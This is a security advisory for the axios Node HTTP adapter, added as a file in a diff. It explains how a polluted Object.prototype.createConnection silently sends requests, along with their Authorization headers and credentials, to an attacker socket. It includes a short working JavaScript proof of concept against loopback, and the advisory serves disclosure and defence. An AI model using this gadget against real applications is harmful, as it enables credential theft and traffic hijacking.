@@ -1,0 +1,56 @@
+Summary
+Axios' Node HTTP adapter can act as a read-side prototype-pollution gadget for Node's sensitive createConnection request option. The adapter creates a null-prototype options object, but Node's HTTP client can copy or normalize request options into ordinary objects before connection creation. If Object.prototype.createConnection has been polluted elsewhere in the same process, Node can call the inherited function and create a socket to an attacker-controlled endpoint.
+
+Axios does not create the prototype pollution source. The vulnerability is that axios does not set an own safe value for a sensitive transport option before handing options to Node.
+
+Impact
+Given a prior same-process prototype-pollution primitive, an attacker can redirect later axios Node HTTP requests at the socket layer while the request URL and axios config still appear to target the legitimate origin. The attacker-controlled endpoint can receive request headers and bodies, including Authorization headers, cookies, API keys, and service credentials, and can return attacker-controlled responses to the application.
+
+This can bypass application destination validation that checks the URL before calling axios, because the URL remains legitimate while the underlying socket goes elsewhere.
+
+Affected Functionality
+Affected:
+
+Node.js HTTP adapter.
+HTTP and HTTPS request paths that rely on Node/follow-redirects option processing and do not set an own safe createConnection.
+Processes where Object.prototype.createConnection is polluted.
+Not affected:
+
+Browser adapters.
+Processes without prototype pollution.
+Requests using a custom trusted transport that ignores inherited createConnection and sanitizes options internally.
+Technical Details
+lib/adapters/http.js creates:
+
+const options = Object.assign(Object.create(null), {
+  path,
+  method,
+  headers,
+  agents: { http: httpAgent, https: httpsAgent },
+  auth,
+  protocol,
+  family,
+  beforeRedirect: dispatchBeforeRedirect,
+  beforeRedirects: Object.create(null),
+  http2Options,
+});
+The object does not include an own createConnection property. Local verification on axios 1.18.1 polluted Object.prototype.createConnection to connect to an attacker loopback server. A request to a legitimate loopback server with an Authorization header returned the attacker's response; the legitimate server received no request and the attacker server received Bearer SECRET.
+
+Proof of Concept of Attack
+Constrained local demonstration:
+
+Object.prototype.createConnection = function (_options, cb) {
+  const socket = net.createConnection({ host: '127.0.0.1', port: attackerPort }, () => {
+    if (typeof cb === 'function') cb(null, socket);
+  });
+  return socket;
+};
+
+await axios.get('http://127.0.0.1:<legit-port>/secret', {
+  headers: { Authorization: 'Bearer SECRET' },
+  proxy: false
+});
+Expected safe behavior is that the legitimate server receives the request. Current affected behavior lets the attacker server receive the request and return the response.
+
+Workarounds
+Run axios in a process where prototype pollution is not present. For high-risk internal clients, use a custom trusted transport or agent layer that sets and enforces its own connection creation behavior instead of allowing inherited Node request options to participate.
